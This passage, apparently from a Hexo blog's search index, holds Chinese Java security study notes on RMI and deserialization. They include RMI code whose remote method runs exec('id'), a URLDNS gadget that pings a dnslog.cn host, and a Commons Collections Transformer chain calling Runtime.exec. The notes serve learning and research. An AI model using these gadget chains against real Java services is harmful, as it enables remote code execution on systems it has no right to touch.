class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        Rmi rmi1 = (Rmi) registry.lookup(<span class="string">&quot;rmi&quot;</span>);</span><br><span class="line">        System.out.println(rmi1.hello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="LocateRegistry"><a href="#LocateRegistry" class="headerlink" title="LocateRegistry"></a>LocateRegistry</h4><p>用于获取到注册中心的一个连接，这个连接可以用于获取一个远程对象的引用。也可以创建一个注册中心。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);</span><br></pre></td></tr></table></figure><h4 id="RemoteObject"><a href="#RemoteObject" class="headerlink" title="RemoteObject"></a>RemoteObject</h4><p>重新覆写了<code>Object</code>对象中的equals,hashCode,toString方法，从而可以用于远程调用</p><h4 id="UnicastRemoteObject"><a href="#UnicastRemoteObject" class="headerlink" title="UnicastRemoteObject"></a>UnicastRemoteObject</h4><p>用于RMI Server中导出一个远程对象并获得一个stub。这个stub封装了底层细节，用于和远程对象进行通信。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloworld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">Rmi</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        InputStream in = runtime.exec(<span class="string">&quot;id&quot;</span>).getInputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        in.read(bytes);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">RemoteHelloworld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Unreferenced"><a href="#Unreferenced" class="headerlink" title="Unreferenced"></a>Unreferenced</h4><p>一个interface, 声明了方法：<code>void unreferenced()</code>如果一个远程对象实现了此接口，则这个远程对象在没有任何客户端引用的时候，这个方法会被调用。</p><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>服务端为kali</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">rmi</span><br><span class="line">├── RemoteHelloworld.java</span><br><span class="line">├── Rmi.java</span><br><span class="line">└── Servet.java</span><br><span class="line"></span><br><span class="line"><span class="comment">//RemoteHelloworld.java</span></span><br><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloworld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">Rmi</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        InputStream in = runtime.exec(<span class="string">&quot;id&quot;</span>).getInputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        in.read(bytes);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">RemoteHelloworld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Rmi.java</span></span><br><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Rmi</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Servet.java</span></span><br><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Servet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Rmi rmi = <span class="keyword">new</span> rmi.RemoteHelloworld();</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;rmi server already start&quot;</span>);</span><br><span class="line">        registry.rebind(<span class="string">&quot;rmi&quot;</span>,rmi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>踩坑指南</p><p>显示连接超时，大概率是因为服务端/etc/hosts 指定的除localhost之外的映射是一个内网网址，网上给出了几种解决方案，</p><blockquote><p>第一种 删除/etc/hosts对应记录</p><p>第二种 运行时增加<code>-Djava.rmi.server.hostname=服务器真实外网IP</code>参数</p><p>第三种 服务端代码中增加System.setProperty(“java.rmi.server.hostname”,”外网IP”);</p></blockquote><p>但是使用上面三种都无法解决我的问题，最终将/etc/hosts中映射地址改为公网地址</p><p><img src="/2021/10/31/java_study/java_day2/image-20211013110803852.png" alt="image-20211013110803852"></p></li></ul><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>客户端为Mac</p><p>客户端目录结构应该与服务端保持一致，并且客户端与服务端都应该有相同的Remote接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">rmi</span><br><span class="line">├── ClientDemo.java</span><br><span class="line">└── Rmi.java</span><br><span class="line">  </span><br><span class="line"><span class="comment">//ClientDemo.java</span></span><br><span class="line">  <span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"><span class="comment">//        Rmi rmi = (Rmi) Naming.lookup(&quot;rmi://172.16.173.2:1099/rmi&quot;);</span></span><br><span class="line"><span class="comment">//        String hello = rmi.hello();</span></span><br><span class="line"><span class="comment">//        System.out.println(hello);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;172.16.173.2&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        Rmi rmi1 = (Rmi) registry.lookup(<span class="string">&quot;rmi&quot;</span>);</span><br><span class="line">        System.out.println(rmi1.hello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Rmi.java</span></span><br><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Rmi</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终成功利用<img src="/2021/10/31/java_study/java_day2/image-20211013110947505.png" alt="image-20211013110947505"></p>]]></content>
      
      
      
        <tags>
            
            <tag> java_study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java 学习日程（URLDNS）</title>
      <link href="/2021/10/31/java_study/java_day3/"/>
      <url>/2021/10/31/java_study/java_day3/</url>
      
        <content type="html"><![CDATA[<h2 id="day3—反序列化"><a href="#day3—反序列化" class="headerlink" title="day3—反序列化"></a>day3—反序列化</h2><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()--&gt;putVal(hash())</span><br><span class="line">|</span><br><span class="line">HashMap.hash()--&gt; key.hashCode()--&gt;key=new URL()</span><br><span class="line">|</span><br><span class="line">URL.hashCode()--&gt;URLStreamHandler.hashcode()</span><br><span class="line">|</span><br><span class="line">URLStreamHandler.hashcode()--&gt;getHostAddress()</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HashMap hashMap=<span class="keyword">new</span> HashMap();</span><br><span class="line">URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://he2kr6.dnslog.cn&quot;</span>);</span><br><span class="line">hashMap.put(url,<span class="number">123</span>);</span><br><span class="line"><span class="comment">//防止两次请求dns</span></span><br><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">Field f = clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">f.set(url,<span class="number">123</span>);</span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;Object&quot;</span>);</span><br><span class="line">ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">os.writeObject(hashMap);</span><br><span class="line">FileInputStream test =<span class="keyword">new</span> FileInputStream(<span class="string">&quot;Object&quot;</span>);</span><br><span class="line">ObjectInputStream oi = <span class="keyword">new</span> ObjectInputStream(test);</span><br><span class="line">oi.readObject();</span><br></pre></td></tr></table></figure><h3 id="Common-Collections"><a href="#Common-Collections" class="headerlink" title="Common- Collections"></a>Common- Collections</h3><h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Transformer</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//demo</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>首先我们会new一个<code>Transformer</code>数组，注意：它并不是一个对象，因为<code>Transformer</code>是一个接口，无法创建实例，它只是一个存储实例的数组！</p><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>接下来就是数组中存在的参数，可以看到我们第一个参数创建了一个<code>ConstantTransformer</code>实例，我们跟进<code>ConstantTransformer</code>,可以看到他继承了<code>Transformer</code>接口，我们可以看到他的构造方法是将Object对象赋值给iConstant，而transform又是讲该对象返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>我们可以看到<code>InvokerTransformer</code>的构造方法是获取三个参数<code>方法名、参数类型、参数</code>，而他的<code>transform</code>方法存在反射，根据前面的知识，显而易见的需要在这里构造参数造成命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>下面我们要思考几个问题，我们既然知道<code>InvokerTransformer</code>可以反射执行命令，根据之前学的反射知识，我们需要先获取到类，可以看到在<code>InvokerTransformer.transform</code>中反射获取类的方法为getClass，所以我们需要获取一个类的实例</p><p>由此，我们就很清楚的知道为什么需要<code>ConstantTransformer</code>，因为它的<code>transform</code>方法刚好返回一个对象</p><p>那现在只需要做的就是分别调用<code>InvokerTransformer、ConstantTransformer</code>的<code>transform</code>方法，并把<code>ConstantTransformer</code>的返回值作为<code>InvokerTransformer.transform</code>的参数</p><p>接着我们介绍一下<code>ChainedTransformer</code> ，首先我们跟的时候发现他的初始化方法就是将输入的数组赋值，那我们再去看一下他的<code>transform</code>方法，这个就很有趣了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>相信大家一眼就可以看出是按顺序调用数组内对象的<code>transform</code>方法，并把前一个的返回值作为下一个对象的输入，这和我们前面所需要的刚好匹配</p><p>那现在我们就可以写出一个最简单的命令执行方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><p>当然我们直接去触发<code>transformerChain.transform(null);</code>肯定是不行的，我们需要利用其他的方法来触发，网上很多文章都是通过<code>TransformedMap</code>类来触发，那我们看一下这个类是如何触发的</p><p>我们查看<code>TransformedMap</code>可以看到他的初始化方法并不能直接调用，需要使用<code>TransformedMap.decorate()</code>方法去触发，传入参数有三个（Map类型，key，value），我们全局寻找有哪些地方使用<code>transform</code>方法,可以找到<code>transformValue、transformKey</code>两个地方，那我们需要知道在哪些地方调用了这两个方法，我们会看到在put方法里会调用，那么我们只需触发<code>put</code>方法就可以调用</p><p>所以我们最终的调用栈为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TransformedMap-&gt;put</span><br><span class="line">TransformedMap-&gt;transformValue</span><br><span class="line">ChainedTransformer-&gt;transform</span><br><span class="line">ConstantTransformer</span><br><span class="line">InvokerTransformer</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> java_study </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
